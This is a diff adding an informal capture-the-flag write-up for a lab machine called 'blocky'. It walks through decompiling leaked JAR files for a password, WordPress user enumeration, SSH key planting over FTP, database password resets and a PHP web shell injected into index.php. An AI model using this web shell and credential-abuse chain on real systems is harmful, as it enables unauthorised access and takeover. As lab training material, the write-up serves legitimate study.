@@ -1,0 +1,54 @@
+machine name: blocky
+
+As usaual running automated.sh 
+now nmap has 22,80,21
+
+method 1:
+
+whn we started enumeration and checked for results of direcsearch
+we got two jar files lets decompile them
+two methods 
+using jad 
+jad unzipped.class[file]
+using jd-gui
+simple open in this it contains password
+
+when we tried for ssh with root its not root password lets try to enumertae for other use we got to know worrdpress
+exist 
+wpscan --url http://10.10.10.37 --enumerate u
+
+we found user with name notch
+ssh notch@10.10.x.x by using that password we got in now when we check for privilage escaltion we see nitch can run everything
+so sudo su lets us root acces
+
+method 2:
+we know notch password lets us in so lets try to conect using ftp
+ftp 10.10.10.37
+username:notch
+password:
+dir 
+there is no ssh folder
+lets make one 
+mkdir .ssh
+and import pubkeys from our kali
+put ida_rsa.pub
+now lets connect to notch it will connect without pasword
+but since we dont know password we cant do sudo su
+lets check for folders
+in var/www ewe have wp-config file when we cat it we have username:wordpress and password:
+when we tried to login into the wordpres it failed but lets try same for phpmyadmin we succesful into cpanel
+when we wordpress-.>wpuser table ->we have notch and its hash
+lets change pas hash
+php -a
+echo password_hash('Anypassword',PASSWORD_DEFAULT) wil echo an hashed pass 
+change in php my admin
+now after changing try to login into wp and we sucesfullu loged in so after logging we can chnge index.php
+file with echo system($_REQUEST['sheri']); and refres the main page and add ?sheri=ls we can see rc
+there for nc reverse shell from penterster monkeywe got in as www-data use we check for phpmyadmin config file
+it contain notch password for server  now we lgged in as that user now change the user and sudo su
+done
+
+
+
+method 3:
+using linux exploit suggester
